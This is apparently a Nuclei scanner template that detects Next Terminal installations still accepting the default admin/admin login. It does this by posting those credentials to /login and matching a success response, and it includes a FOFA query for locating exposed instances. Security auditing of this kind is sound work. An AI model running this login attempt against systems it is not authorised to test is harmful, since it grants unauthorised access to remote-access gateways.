id: next-terminal-default-login

info:
  name: Next Terminal - Default Login
  author: ritikchaddha
  severity: high
  description: |
    Next Terminal default login was discovered.
  reference:
    - https://github.com/dushixiang/next-terminal
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="Next Terminal"
  tags: default-login,next-terminal,next,vuln

http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"{{username}}","password":"{{password}}","remember":false}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'message":"success'
          - 'code":1'
          - 'data":"'
        condition: and

      - type: status
        status:
          - 200
